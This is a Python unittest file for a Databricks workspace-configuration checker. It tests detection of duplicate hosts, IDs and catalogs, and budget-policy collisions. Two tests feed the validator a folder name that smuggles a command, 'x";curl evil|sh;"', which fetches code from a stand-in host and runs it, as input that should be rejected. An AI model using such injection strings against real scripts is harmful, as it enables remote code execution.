"""scripts/workspaces.py: checks across workspace folders, and reading workspace.yaml for CI."""
import pathlib
import shutil
import tempfile
import unittest

from helpers import load

ws = load("workspaces")


class Fleet(unittest.TestCase):
    def setUp(self):
        self.root = pathlib.Path(tempfile.mkdtemp())

    def tearDown(self):
        shutil.rmtree(self.root)

    def add(self, name, bu="fin", account="acct-1", host=None, id_=None, catalog=None, budget_policies=True):
        d = self.root / name
        d.mkdir()
        host = host or f"https://adb-{abs(hash(name)) % 10**6}.1.azuredatabricks.net"
        id_ = id_ or str(abs(hash(name + "id")) % 10**9)
        (d / "workspace.yaml").write_text(
            f"bu: {bu}          # business unit\nlob: X\naccount_id: \"{account}\"\nhost: {host}   # url\nid: {id_}\nci: true\n"
)
        if catalog:
            (d / "catalog.yaml").write_text(f"default_catalog: null\ncatalog:\n  name: {catalog}   # metastore-wide\n  schemas:\n    a:\n      comment: x\n")
        if not budget_policies:
            (d / "cost.yaml").write_text("budget_policies:\n  enabled: false   # managed elsewhere\n")
        return d

    def problems(self):
        return ws.check(self.root)[1]

    def test_distinct_workspaces_pass(self):
        self.add("fin-dev", bu="fin", catalog="fin_dev")
        self.add("hr-dev", bu="hr", catalog="hr_dev")
        self.add("_example", bu="fin", catalog="fin_dev")  # templates are not workspaces
        self.assertEqual(self.problems(), [])

    def test_same_host_or_id(self):
        self.add("a", bu="a", host="https://adb-1.1.azuredatabricks.net", id_="1")
        self.add("b", bu="b", host="https://adb-1.1.azuredatabricks.net/", id_="1")
        got = self.problems()
        self.assertEqual(len(got), 2, got)
        self.assertTrue(any("same host" in p for p in got) and any("same workspace id" in p for p in got))

    def test_same_default_catalog_and_derived_id(self):
        # Without a catalog name, both get the baseline's {bu}_citizen_dev; the ID comes from the host.
        a = self.add("fin-dev", bu="fin", account="acct-1", budget_policies=False)
        b = self.add("fin-prd", bu="fin", account="acct-2", budget_policies=False)
        got = " ".join(self.problems())
        self.assertIn("same catalog name (fin_citizen_dev)", got)
        (b / "catalog.yaml").write_text("catalog: null   # no catalog here\n")
        self.assertEqual(self.problems(), [])
        for d in (a, b):
            (d / "workspace.yaml").write_text((d / "workspace.yaml").read_text().replace("\nid: ", "\n# id: "))
        (b / "catalog.yaml").write_text("catalog:\n  name: fin_prd_cd\n")
        (b / "workspace.yaml").write_text((b / "workspace.yaml").read_text().replace(
            "host: " + ws.workspace_info(b)["host"], "host: " + ws.workspace_info(a)["host"]))
        got = " ".join(self.problems())
        self.assertIn("same host", got)
        self.assertIn("same workspace id", got, "the ID read from the host is compared too")

    def test_same_catalog(self):
        self.add("a", bu="a", catalog="shared_cat")
        self.add("b", bu="b", catalog="shared_cat")
        self.assertIn("same catalog name (shared_cat)", " ".join(self.problems()))

    def test_same_bu_on_one_account_collides_on_budget_policies(self):
        self.add("fin-dev", bu="fin", catalog="fin_dev")
        self.add("fin-prd", bu="FIN", catalog="fin_prd")
        got = self.problems()
        self.assertEqual(len(got), 1, got)
        self.assertIn("FIN-SHARED", got[0])

    def test_same_bu_is_fine_on_another_account_or_without_budget_policies(self):
        self.add("fin-dev", bu="fin", account="acct-1", catalog="fin_dev")
        self.add("fin-prd", bu="fin", account="acct-2", catalog="fin_prd")
        self.add("fin-test", bu="fin", account="acct-1", budget_policies=False, catalog="fin_test")
        self.assertEqual(self.problems(), [])

    def test_unsafe_folder_names(self):
        self.add('x";curl evil|sh;"')
        self.add("Has Space")
        got = self.problems()
        self.assertEqual(len(got), 2, got)

    def test_field_reads_quoted_and_commented_values(self):
        self.add("a", host="https://adb-9.1.azuredatabricks.net")
        orig = ws.WORKSPACES
        ws.WORKSPACES = self.root
        try:
            self.assertEqual(ws.field("a", "host"), "https://adb-9.1.azuredatabricks.net")
            self.assertEqual(ws.field("a", "account_id"), "acct-1")
            with self.assertRaises(SystemExit):
                ws.field("a", "missing")
        finally:
            ws.WORKSPACES = orig

    def test_names(self):
        self.assertEqual(ws.names(["a", "b"], self.root), ["a", "b"])
        with self.assertRaises(SystemExit):
            ws.names(['x";curl evil|sh;"'], self.root)
    def test_config_and_dev_folders(self):
        # dev/workspaces/ holds the workspaces that test the framework; names are unique across both.
        config, dev = self.root / "config/workspaces", self.root / "dev/workspaces"
        config.mkdir(parents=True), dev.mkdir(parents=True)
        orig = (ws.WORKSPACES, ws.DEV_WORKSPACES)
        ws.WORKSPACES, ws.DEV_WORKSPACES = config, dev
        try:
            for root, name, bu in ((config, "org-ws", "o"), (dev, "dev-ws", "d")):
                (root / name).mkdir()
                (root / name / "workspace.yaml").write_text(f"bu: {bu}\nhost: https://{name}\nid: {bu}1\n")
            self.assertEqual(ws.ws_dir("dev-ws"), dev / "dev-ws")
            self.assertEqual(ws.field("org-ws", "host"), "https://org-ws")
            self.assertEqual(ws.names(["org-ws", "dev-ws"]), ["org-ws", "dev-ws"])
            with self.assertRaises(SystemExit):
                ws.names(["not-there"])
            self.assertEqual(ws.check()[1], [])
            (dev / "org-ws").mkdir()
            (dev / "org-ws" / "workspace.yaml").write_text("bu: z\nhost: https://other\nid: z1\n")
            self.assertEqual(ws.check()[1], ["org-ws is in both config/workspaces/ and dev/workspaces/: keep one"])
            with self.assertRaises(SystemExit):
                ws.ws_dir("org-ws")
        finally:
            ws.WORKSPACES, ws.DEV_WORKSPACES = orig

    def test_the_repository_passes(self):
        self.assertEqual(ws.check()[1], [])


if __name__ == "__main__":
    unittest.main()
